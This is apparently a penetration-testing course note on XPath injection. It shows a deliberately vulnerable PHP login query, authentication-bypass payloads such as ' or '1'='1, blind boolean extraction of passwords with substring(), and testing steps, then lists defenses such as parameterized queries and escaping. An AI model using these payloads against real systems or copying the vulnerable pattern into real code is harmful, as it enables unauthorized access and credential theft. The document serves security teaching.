---
tags: [vapt, injection, intermediate]
difficulty: intermediate
module: "10 - Injection Attacks"
topic: "10.02 XPath Injection"
---

# 10.02 — XPath Injection

## What is XPath?

XPath is a query language for XML documents. Applications use XPath to search XML data — like SQL searches databases. When user input is inserted into XPath queries without sanitization, attackers can manipulate the query logic.

```
XML DOCUMENT EXAMPLE:
  <users>
    <user>
      <username>admin</username>
      <password>secret</password>
      <role>admin</role>
    </user>
    <user>
      <username>john</username>
      <password>john123</password>
      <role>user</role>
    </user>
  </users>

XPATH QUERY:
  //user[username='admin' and password='secret']
  → Returns: the admin user element

INJECTION:
  //user[username='admin' or '1'='1' and password='anything']
  → Returns: ALL users! (or '1'='1' is always true!)
```

---

## Authentication Bypass

```
VULNERABLE CODE (PHP):
  $xpath = "//user[username='" . $username . "' and password='" . $password . "']";
  $result = $xml->xpath($xpath);

NORMAL QUERY:
  Input: admin / secret
  Query: //user[username='admin' and password='secret']
  
ATTACK — ALWAYS-TRUE INJECTION:
  Username: admin' or '1'='1
  Password: anything
  Query: //user[username='admin' or '1'='1' and password='anything']
  → 'admin' OR TRUE → TRUE → returns admin user regardless of password!

SIMPLER BYPASS:
  Username: ' or ''='
  Password: ' or ''='
  Query: //user[username='' or ''='' and password='' or ''='']
  → ''='' is always true → ALL users match!
```

---

## XPath Injection Payloads

```
AUTHENTICATION BYPASS:
  ' or '1'='1
  ' or ''='
  ' or 1=1 or 'a'='a
  admin' or 1=1 or 'a'='a

COMMENT-LIKE (XPath has no comments — use always-true instead):
  ' or '1'='1']%00       ← null byte (terminate string)

BOOLEAN TESTS (for data extraction):
  ' and substring(username,1,1)='a
  → If login succeeds → first char of username is 'a'

ALL USERS:
  ' or '1'='1' or 'x'='x
  * (wildcard in some contexts)
```

---

## XPath Data Extraction (Blind Boolean)

```
BLIND XPATH INJECTION — EXTRACT DATA:
  
  Test if username length > 5:
  ' or string-length(//user[1]/username) > 5 or 'x'='y
  
  Extract first character of admin password:
  ' or substring(//user[username='admin']/password,1,1)='s or 'x'='y
  If login succeeds: first char = 's'
  
  Brute force each position:
  Position 1: 's', 'se', 'sec'...
  → Eventually: 'secret'

XPath FUNCTIONS USED FOR EXTRACTION:
  string-length(str)        → length of string
  substring(str, pos, len)  → substring from position
  count(nodeset)            → count nodes
  string(node)              → convert to string
  normalize-space(str)      → trim whitespace
  translate()               → character replacement
  contains(str, substr)     → true/false contains check
```

---

## Error-Based XPath Injection

```
IF APP SHOWS XPATH ERRORS:
  Inject: '
  → Error: "XPath syntax error near ''" → vulnerable!
  
  The error often reveals the XPath query structure!
  Use the structure to build a valid injection.
```

---

## Testing for XPath Injection

```bash
# STEP 1: INJECT SINGLE QUOTE:
?username=admin'
?username=john'
# Error? → Possible XPath or SQL injection

# STEP 2: ALWAYS-TRUE TEST:
?username=admin' or '1'='1
?password=anything
# Login succeeds despite wrong password → XPath injection!

# STEP 3: COMPARE WITH SQL INJECTION:
# XPath injection:  ' or '1'='1
# SQL injection:    ' OR '1'='1' --
# They look similar! Both are query language injections

# BURP SUITE:
# Intercept login request → Repeater → modify username
# Test: admin' or '1'='1
# Observe response difference
```

---

## Defense

```
PROTECTION:
  1. Parameterized XPath queries:
     // Java - use XPathVariableResolver
     XPath xpath = factory.newXPath();
     xpath.setXPathVariableResolver(resolver);
     // Set variables rather than string concatenation
  
  2. Input validation — allowlist:
     Only alphanumeric + specific safe chars for username/password
  
  3. Escape XPath special chars:
     Replace ' with '' (double single quote) in XPath string context
     Chars to escape: ' " < > & \ / []

  4. Use an XML library that handles parameterization:
     Python: lxml with XPath variables
     Java: XPathVariableResolver
```

---

## XPath vs SQL Injection Comparison

```
             XPATH                   SQL
---------    -----                   ---
Target:      XML document            Relational database
Query lang:  XPath                   SQL
Auth bypass: ' or '1'='1            ' OR '1'='1' --
Comments:    None                    --, #, /**/
Wildcard:    *                       %
Boolean:     and, or, not            AND, OR, NOT
Functions:   substring(), count()    SUBSTRING(), COUNT()
Data dump:   Sequential boolean      UNION-based
```

---

## Related Notes
- [[01 - LDAP Injection]] — query language injection
- [[03 - XML Injection]] — XML manipulation
- [[Module 06 - SQL Injection]] — parallel concept
- [[Module 14 - XXE]] — XML-based attacks
